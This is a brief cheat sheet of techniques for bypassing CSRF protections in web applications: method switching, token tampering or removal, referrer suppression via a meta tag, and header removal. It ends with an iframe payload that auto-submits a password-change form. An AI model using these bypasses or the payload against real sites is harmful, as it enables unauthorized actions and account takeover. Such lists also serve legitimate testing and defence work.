### 1. Change request method.
```
POST -> GET
GET -> POST
```

### 2. Use valid token of another ID

### 3. Replacing value of same length
```
csrf_token=m9ucsjdcsdhcush8vuhsdvs8dv (valid csrf token)
csrf_token=11111111111111111111111111 (or try gibrish)
```
### 4. Removing token/delete token parameter

### 5. Decoding token (i.e. md5, base64)

### 6. Use static part of token
```
csrf_toekn=staticRandom (valid)
csrf_token=static (bypass)
```

### 7. Clickjacking
```
Check if there any anti-clickjacking header or not.
```

### 8. Session fixation(double session)
```
Sometime webapp use same csrf token twice in same request and check both tokens
are same or not.
```

### 9. Bypassing Referrer header.
```
Many sites check referrer header. If so then csrf will work only localhost but 
not web server. 
Use meta tag name="referrer" content="no-referre" in html code.
<meta name="referrer" content="no-referre">
```

### 10. Remove X-CSRF-TOKEN
```
Change from POST to GET and remove X-CSRF-TOKEN
```
```
Every POST/PUT/PATCH request is protected by X-CSRF-TOKEN.

- Changed POST -> GET
- Remove X-CSRF-TOKEN
- Change CSRF token value "true" or "1"
- Change Content-Type to application/json;charset=UTF-8
```

### Origin Header Bypass
```
<iframe src='data:text/html,<body onload="document.forms[0].submit()"><form action="//example.com/api/auth?password=newpass" method="post"></body>'></iframe>
```
